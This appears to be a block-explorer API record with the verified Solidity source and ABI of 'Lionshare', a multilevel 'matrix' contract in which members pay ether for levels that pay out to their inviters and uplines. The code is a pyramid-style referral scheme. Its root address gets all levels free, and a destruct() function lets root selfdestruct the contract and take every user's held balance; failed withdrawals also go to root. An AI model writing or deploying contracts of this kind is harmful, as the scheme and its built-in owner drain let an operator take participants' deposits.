{"status":"1","message":"OK","result":[{"SourceCode":"/*! lionshare.sol | (c) 2020 Develop by BelovITLab LLC (smartcontract.ru), author @edward | SPDX-License-Identifier: MIT License \r\nthis is lionshare matrix, first multilevel matrix that starts with 0.04eth only*/\r\n\r\npragma solidity 0.6.8;\r\n\r\ncontract Lionshare {\r\n    struct User {\r\n        uint256 id;\r\n        address inviter;\r\n        uint256 balance;\r\n        mapping(uint8 => uint40) expires;\r\n        mapping(uint8 => address) uplines;\r\n        mapping(uint8 => address[]) referrals;\r\n    }\r\n\r\n    uint40 public LEVEL_TIME_LIFE = 120 days;\r\n\r\n    address payable public root;\r\n    uint256 public last_id;\r\n\r\n    uint256[] public levels;\r\n    mapping(address => User) public users;\r\n    mapping(uint256 => address) public users_ids;\r\n\r\n    event Register(address indexed addr, address indexed inviter, uint256 id);\r\n    event BuyLevel(address indexed addr, address indexed upline, uint8 level, uint40 expires);\r\n    event Profit(address indexed addr, address indexed referral, uint256 value);\r\n    event Lost(address indexed addr, address indexed referral, uint256 value);\r\n\r\n    constructor() public {\r\n        levels.push(0.04 ether);\r\n        levels.push(0.04 ether);\r\n        levels.push(0.04 ether);\r\n\r\n        levels.push(0.22 ether);\r\n        levels.push(0.32 ether);\r\n        levels.push(0.82 ether);\r\n\r\n        levels.push(0.43 ether);\r\n        levels.push(0.63 ether);\r\n        levels.push(1.63 ether);\r\n        \r\n        levels.push(0.84 ether);\r\n        levels.push(1.24 ether);\r\n        levels.push(3.24 ether);\r\n        \r\n        levels.push(1.65 ether);\r\n        levels.push(2.45 ether);\r\n        levels.push(6.45 ether);\r\n        \r\n        levels.push(3.26 ether);\r\n        levels.push(4.96 ether);\r\n        levels.push(12.86 ether);\r\n        \r\n        levels.push(6.47 ether);\r\n        levels.push(9.87 ether);\r\n        levels.push(25.67 ether);\r\n        \r\n        levels.push(12.88 ether);\r\n        levels.push(19.78 ether);\r\n        levels.push(51.28 ether);\r\n        \r\n        levels.push(25.69 ether);\r\n        levels.push(39.59 ether);\r\n        levels.push(102.49 ether);\r\n        \r\n        levels.push(51.30 ether);\r\n        levels.push(79.20 ether);\r\n        levels.push(205.20 ether);\r\n\r\n        root = 0x280f47b4eAE5D775983DB5Ab39b4d66F5Db75cf9;\r\n\r\n        _newUser(root, address(0));\r\n\r\n        for(uint8 i = 0; i < levels.length; i++) {\r\n            users[root].expires[i] = uint40(-1);\r\n\r\n            emit BuyLevel(root, address(0), i, users[root].expires[i]);\r\n        }\r\n    }\r\n\r\n    receive() payable external {\r\n        require(users[msg.sender].id > 0, \"User not register\");\r\n        \r\n        users[msg.sender].balance += msg.value;\r\n\r\n        _autoBuyLevel(msg.sender);\r\n    }\r\n\r\n    fallback() payable external {\r\n        _register(msg.sender, bytesToAddress(msg.data), msg.value);\r\n    }\r\n\r\n    function _newUser(address _addr, address _inviter) private {\r\n        users[_addr].id = ++last_id;\r\n        users[_addr].inviter = _inviter;\r\n        users_ids[last_id] = _addr;\r\n\r\n        emit Register(_addr, _inviter, last_id);\r\n    }\r\n\r\n    function _buyLevel(address _user, uint8 _level) private {\r\n        require(levels[_level] > 0, \"Invalid level\");\r\n        require(users[_user].balance >= levels[_level], \"Insufficient funds\");\r\n        require(_level == 0 || users[_user].expires[_level - 1] > block.timestamp, \"Need previous level\");\r\n        \r\n        users[_user].balance -= levels[_level];\r\n        users[_user].expires[_level] = uint40((users[_user].expires[_level] > block.timestamp ? users[_user].expires[_level] : block.timestamp) + LEVEL_TIME_LIFE);\r\n        \r\n        uint8 round = _level / 3;\r\n        uint8 offset = _level % 3;\r\n        address upline = users[_user].inviter;\r\n\r\n        if(users[_user].uplines[round] == address(0)) {\r\n            while(users[upline].expires[_level] < block.timestamp) {\r\n                emit Lost(upline, _user, levels[_level]);\r\n\r\n                upline = users[upline].inviter;\r\n            }\r\n\r\n            upline = this.findFreeReferrer(upline, round);\r\n\r\n            users[_user].uplines[round] = upline;\r\n            users[upline].referrals[round].push(_user);\r\n        }\r\n        else upline = users[_user].uplines[round];\r\n\r\n        address profiter = this.findUpline(upline, round, offset);\r\n\r\n        uint256 value = levels[_level];\r\n\r\n        if(_level == 0) {\r\n            uint256 com = value / 10;\r\n\r\n            if(payable(users[_user].inviter).send(com)) {\r\n                value -= com;\r\n                \r\n                emit Profit(users[_user].inviter, _user, com);\r\n            }\r\n        }\r\n\r\n        users[profiter].balance += value;\r\n        _autoBuyLevel(profiter);\r\n        \r\n        emit Profit(profiter, _user, value);\r\n        emit BuyLevel(_user, upline, _level, users[_user].expires[_level]);\r\n    }\r\n\r\n    function _autoBuyLevel(address _user) private {\r\n        for(uint8 i = 0; i < levels.length; i++) {\r\n            if(levels[i] > users[_user].balance) break;\r\n\r\n            if(users[_user].expires[i] < block.timestamp) {\r\n                _buyLevel(_user, i);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _register(address _user, address _upline, uint256 _value) private {\r\n        require(users[_user].id == 0, \"User arleady register\");\r\n        require(users[_upline].id != 0, \"Upline not register\");\r\n        require(_value >= levels[0], \"Insufficient funds\");\r\n        \r\n        users[_user].balance += _value;\r\n\r\n        _newUser(_user, _upline);\r\n        _buyLevel(_user, 0);\r\n    }\r\n\r\n    function register(uint256 _upline_id) payable external {\r\n        _register(msg.sender, users_ids[_upline_id], msg.value);\r\n    }\r\n\r\n    function buy(uint8 _level) payable external {\r\n        require(users[msg.sender].id > 0, \"User not register\");\r\n        \r\n        users[msg.sender].balance += msg.value;\r\n\r\n        _buyLevel(msg.sender, _level);\r\n    }\r\n\r\n    function withdraw(uint256 _value) payable external {\r\n        require(users[msg.sender].id > 0, \"User not register\");\r\n\r\n        _value = _value > 0 ? _value : users[msg.sender].balance;\r\n\r\n        require(_value <= users[msg.sender].balance, \"Insufficient funds\");\r\n        \r\n        users[msg.sender].balance -= _value;\r\n\r\n        if(!payable(msg.sender).send(_value)) {\r\n            root.transfer(_value);\r\n        }\r\n    }\r\n\r\n    function destruct() external {\r\n        require(msg.sender == root, \"Access denied\");\r\n\r\n        selfdestruct(root);\r\n    }\r\n\r\n    function findUpline(address _user, uint8 _round, uint8 _offset) external view returns(address) {\r\n        if(_user == root || _offset == 0) return _user;\r\n\r\n        return this.findUpline(users[_user].uplines[_round], _round, _offset - 1);\r\n    }\r\n\r\n    function findFreeReferrer(address _user, uint8 _round) external view returns(address) {\r\n        if(users[_user].referrals[_round].length < 2) return _user;\r\n\r\n        address[] memory refs = new address[](1024);\r\n        \r\n        refs[0] = users[_user].referrals[_round][0];\r\n        refs[1] = users[_user].referrals[_round][1];\r\n\r\n        for(uint16 i = 0; i < 1024; i++) {\r\n            if(users[refs[i]].referrals[_round].length < 2) {\r\n                return refs[i];\r\n            }\r\n\r\n            if(i < 511) {\r\n                uint16 n = (i + 1) * 2;\r\n\r\n                refs[n] = users[refs[i]].referrals[_round][0];\r\n                refs[n + 1] = users[refs[i]].referrals[_round][1];\r\n            }\r\n        }\r\n\r\n        revert(\"No free referrer\");\r\n    }\r\n\r\n    function bytesToAddress(bytes memory _data) private pure returns(address addr) {\r\n        assembly {\r\n            addr := mload(add(_data, 20))\r\n        }\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint40\",\"name\":\"expires\",\"type\":\"uint40\"}],\"name\":\"BuyLevel\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Lost\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Profit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"inviter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"Register\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"LEVEL_TIME_LIFE\",\"outputs\":[{\"internalType\":\"uint40\",\"name\":\"\",\"type\":\"uint40\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_level\",\"type\":\"uint8\"}],\"name\":\"buy\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"destruct\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"_round\",\"type\":\"uint8\"}],\"name\":\"findFreeReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"_round\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_offset\",\"type\":\"uint8\"}],\"name\":\"findUpline\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"last_id\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"levels\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_upline_id\",\"type\":\"uint256\"}],\"name\":\"register\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"root\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"inviter\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"users_ids\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"Lionshare","CompilerVersion":"v0.6.8+commit.0bbfe453","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://7765fc419f94a2a825b3bb329006922def0b2756ac01f421d8e98971bdea8a15"}]}